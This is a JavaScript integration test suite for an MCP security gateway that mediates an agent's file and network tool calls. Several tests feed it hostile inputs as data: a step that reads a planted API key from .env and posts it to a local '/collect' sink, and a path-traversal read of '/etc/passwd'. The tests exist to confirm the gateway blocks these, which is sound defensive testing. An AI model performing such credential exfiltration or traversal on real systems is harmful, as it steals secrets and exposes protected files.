// Process-level integration tests.
//
// These tests do not mock the protocol: they start a real MCP server, put the
// gateway between it and a real client, and then check the outside world —
// files on disk, an HTTP sink that must stay empty, and a ledger that must
// fail verification after a single byte changes.
import { after, before, test } from 'node:test';
import assert from 'node:assert/strict';
import { spawn, spawnSync } from 'node:child_process';
import { existsSync, mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { dirname, join, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { McpPipe, approveOnce, waitForReady } from '../demo/client.mjs';

const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), '..');
const BIN = join(ROOT, 'bin/moongate.mjs');
const POLICY = join(ROOT, 'examples/policy.workspace.json');
const SERVER = join(ROOT, 'demo/server.mjs');
const SINK_PORT = 8800 + Math.floor(Math.random() * 500);
const SINK = `http://127.0.0.1:${SINK_PORT}`;

let sink;

function prepareWorkspace(name) {
  const workspace = join(ROOT, 'runs', `test-${name}`);
  rmSync(workspace, { recursive: true, force: true });
  mkdirSync(join(workspace, 'config'), { recursive: true });
  mkdirSync(join(workspace, 'notes'), { recursive: true });
  mkdirSync(join(workspace, 'reports'), { recursive: true });
  writeFileSync(
    join(workspace, 'config/.env'),
    'API_KEY=sk-live-TEST-9f3a2b7c1d4e\n',
  );
  writeFileSync(join(workspace, 'notes/todo.md'), '# notes\n');
  return workspace;
}

async function startGateway(name) {
  const workspace = prepareWorkspace(name);
  const ledger = join(ROOT, 'runs', `test-${name}.jsonl`);
  const pipe = new McpPipe(
    process.execPath,
    [BIN, 'run', '--policy', POLICY, '--ledger', ledger, '--', process.execPath, SERVER],
    {
      cwd: ROOT,
      env: { MOONGATE_WORKSPACE: workspace, MOONGATE_SINK: SINK, MOONGATE_POLICY: POLICY },
    },
  );
  const ready = await waitForReady(pipe);
  await pipe.initialize();
  return { pipe, ready, workspace, ledger };
}

before(async () => {
  sink = spawn(process.execPath, [join(ROOT, 'demo/sink.mjs')], {
    stdio: ['ignore', 'ignore', 'pipe'],
    env: { ...process.env, MOONGATE_SINK_PORT: String(SINK_PORT) },
    windowsHide: true,
  });
  await new Promise((resolvePromise, reject) => {
    const timer = setTimeout(() => reject(new Error('sink did not start')), 5000);
    sink.stderr.on('data', (chunk) => {
      if (chunk.includes('listening')) {
        clearTimeout(timer);
        resolvePromise();
      }
    });
  });
});

after(() => {
  sink?.kill();
});

test('denied egress never reaches the network', async () => {
  const { pipe, ledger } = await startGateway('egress');
  try {
    const env = await pipe.callTool('fs.read', { path: 'config/.env' });
    const secret = env.content[0].text.match(/API_KEY=(\S+)/)[1];
    await assert.rejects(
      () => pipe.callTool('net.post', { url: `${SINK}/collect`, body: `k=${secret}` }),
      (error) => {
        assert.equal(error.data.moongate.rule, 'egress-taint');
        assert.equal(error.data.moongate.evidence.length, 1);
        assert.equal(error.data.moongate.evidence[0].source_tool, 'fs.read');
        return true;
      },
    );
    const hits = (await (await fetch(`${SINK}/count`)).json()).hits;
    assert.equal(hits, 0, 'the sink must not receive a blocked request');
    const lines = readFileSync(ledger, 'utf8').trim().split('\n').map((line) => JSON.parse(line));
    assert.ok(lines.some((event) => event.decision === 'deny' && event.rule === 'egress-taint'));
    assert.ok(lines.every((event) => !JSON.stringify(event).includes(secret)), 'ledger must not contain the secret');
  } finally {
    await pipe.close();
  }
});

test('tools the policy denies are not advertised', async () => {
  const { pipe } = await startGateway('advertise');
  try {
    const list = await pipe.request('tools/list', {});
    const names = list.tools.map((tool) => tool.name);
    assert.deepEqual(names.sort(), ['fs.list', 'fs.read', 'fs.write', 'net.post']);
  } finally {
    await pipe.close();
  }
});

test('approval is single-use and bound to the arguments', async () => {
  const { pipe, ready, workspace } = await startGateway('approval');
  try {
    const first = pipe.callTool('fs.write', { path: 'reports/a.md', content: '第一版\n' });
    let pending = null;
    for (let i = 0; i < 50 && !pending; i += 1) {
      const state = await (await fetch(new URL('/state', ready.approval_url))).json();
      pending = state.pending[0] || null;
      if (!pending) await new Promise((resolvePromise) => setTimeout(resolvePromise, 100));
    }
    assert.ok(pending, 'expected a pending approval');
    assert.equal(pending.tool, 'fs.write');
    await approveOnce(ready.approval_url, { approve: true, matchTool: 'fs.write' });
    await first;
    assert.ok(existsSync(join(workspace, 'reports/a.md')));

    const second = pipe.callTool('fs.write', { path: 'reports/a.md', content: '第二版\n' });
    second.catch(() => {});
    let next = null;
    for (let i = 0; i < 50 && !next; i += 1) {
      const state = await (await fetch(new URL('/state', ready.approval_url))).json();
      next = state.pending[0] || null;
      if (!next) await new Promise((resolvePromise) => setTimeout(resolvePromise, 100));
    }
    assert.ok(next, 'a new call must ask again');
    assert.notEqual(next.digest, pending.digest, 'digest must change with the arguments');
    await approveOnce(ready.approval_url, { approve: false, matchTool: 'fs.write' });
    await assert.rejects(() => second, /denied/);
    assert.equal(readFileSync(join(workspace, 'reports/a.md'), 'utf8'), '第一版\n');
  } finally {
    await pipe.close();
  }
});

test('path traversal is normalized before the prefix check', async () => {
  const { pipe } = await startGateway('traversal');
  try {
    await assert.rejects(
      () => pipe.callTool('fs.read', { path: 'reports/../../etc/passwd' }),
      (error) => {
        assert.equal(error.data.moongate.rule, 'deny-escape');
        return true;
      },
    );
  } finally {
    await pipe.close();
  }
});

test('the server still denies when the gateway is bypassed', async () => {
  const workspace = prepareWorkspace('bypass');
  const direct = new McpPipe(process.execPath, [SERVER], {
    cwd: ROOT,
    env: { MOONGATE_WORKSPACE: workspace, MOONGATE_SINK: SINK, MOONGATE_POLICY: POLICY },
  });
  try {
    await direct.initialize();
    const result = await direct.callTool('fs.delete', { path: 'notes/todo.md' });
    assert.equal(result.isError, true);
    assert.match(result.content[0].text, /MoonGate guard \(no-delete\)/);
    assert.ok(existsSync(join(workspace, 'notes/todo.md')), 'file must still exist');
  } finally {
    await direct.close();
  }
});

test('the guard fails closed when its policy cannot load', async () => {
  const workspace = prepareWorkspace('guardfail');
  const broken = join(ROOT, 'runs', 'broken-policy.json');
  writeFileSync(broken, '{"version":1,"default_decision":"maybe"}');
  const direct = new McpPipe(process.execPath, [SERVER], {
    cwd: ROOT,
    env: { MOONGATE_WORKSPACE: workspace, MOONGATE_SINK: SINK, MOONGATE_POLICY: broken },
  });
  try {
    await direct.initialize();
    const result = await direct.callTool('fs.read', { path: 'notes/todo.md' });
    assert.equal(result.isError, true);
    assert.match(result.content[0].text, /guard unavailable/);
  } finally {
    await direct.close();
  }
});

test('policy check reports the effective rules', async () => {
  const result = spawnSyncNode([BIN, 'check', '--policy', POLICY]);
  assert.equal(result.status, 0);
  assert.match(result.stdout, /policy\s+workspace-assistant/);
  assert.match(result.stdout, /deny-escape/);
  assert.match(result.stdout, /rules in evaluation order/);
});

test('ledger verification detects tampering', async () => {
  const { pipe, ledger } = await startGateway('tamper');
  try {
    await pipe.callTool('fs.read', { path: 'notes/todo.md' });
  } finally {
    await pipe.close();
  }
  const intact = spawnSyncNode([BIN, 'verify', '--ledger', ledger]);
  assert.equal(intact.status, 0, intact.stderr);
  const lines = readFileSync(ledger, 'utf8').trim().split('\n');
  const tampered = [...lines];
  tampered[1] = tampered[1].replace(/"ts":\d+/, '"ts":1');
  const path = join(ROOT, 'runs', 'test-tamper-broken.jsonl');
  writeFileSync(path, `${tampered.join('\n')}\n`);
  const broken = spawnSyncNode([BIN, 'verify', '--ledger', path]);
  assert.equal(broken.status, 1);
  assert.match(broken.stderr, /hash mismatch|does not follow/);
});

test('report is generated from the ledger and lists blocked calls', async () => {
  const { pipe, ledger } = await startGateway('report');
  try {
    await assert.rejects(() => pipe.callTool('fs.delete', { path: 'notes/todo.md' }));
  } finally {
    await pipe.close();
  }
  const out = join(ROOT, 'runs', 'test-report.html');
  const result = spawnSyncNode([BIN, 'report', '--ledger', ledger, '--out', out, '--policy', POLICY]);
  assert.equal(result.status, 0, result.stderr);
  const html = readFileSync(out, 'utf8');
  assert.match(html, /fs\.delete/);
  assert.match(html, /哈希链完整/);
});

function spawnSyncNode(args) {
  return spawnSync(process.execPath, args, { encoding: 'utf8' });
}
